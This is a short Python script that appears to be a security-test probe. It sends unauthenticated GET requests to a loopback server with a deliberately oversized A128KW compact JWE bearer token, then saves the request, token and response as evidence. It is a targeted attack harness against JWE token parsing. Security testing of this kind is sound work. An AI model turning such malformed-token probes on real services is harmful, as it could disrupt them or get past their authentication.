#!/usr/bin/env python3
"""Send unauthenticated loopback GETs with an oversized A128KW compact JWE bearer token."""
import os
import socket
import sys

from probe import token

HOST = "127.0.0.1"
PORT = int(os.environ.get("W2_PORT", "18444"))
TAG = os.environ.get("W2_TAG", "oauth-bearer")
EVIDENCE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "evidence")
KEK_HEX = os.environ.get("W2_KEK")


def main():
    ek_len = int(sys.argv[1]) if len(sys.argv) > 1 else 56
    if KEK_HEX:
        kek = bytes.fromhex(KEK_HEX)
        tok = token(ek_len, kek=kek, plaintext=(b"MISHE-W212-" * 5)[:ek_len - 8])
    else:
        tok = token(ek_len)
    req = (
        b"GET /private HTTP/1.1\r\n"
        b"Host: 127.0.0.1:" + str(PORT).encode() + b"\r\n"
        b"User-Agent: w2-oauth-bearer-probe\r\n"
        b"Authorization: Bearer " + tok.encode("ascii") + b"\r\n"
        b"Connection: close\r\n\r\n"
    )
    tag = TAG + "-" + str(ek_len)
    with open(os.path.join(EVIDENCE, tag + "-request.bin"), "wb") as f:
        f.write(req)
    with open(os.path.join(EVIDENCE, tag + "-token.txt"), "w") as f:
        f.write(tok + "\n")
    with socket.create_connection((HOST, PORT), timeout=10) as s:
        s.sendall(req)
        chunks = []
        while True:
            data = s.recv(4096)
            if not data:
                break
            chunks.append(data)
    resp = b"".join(chunks)
    with open(os.path.join(EVIDENCE, tag + "-response.bin"), "wb") as f:
        f.write(resp)
    print("SCENARIO=%s EK_RAW_LEN=%d TOKEN_LEN=%d" % (tag, ek_len, len(tok)))
    print("RESPONSE=" + repr(resp[:200]))


if __name__ == "__main__":
    main()
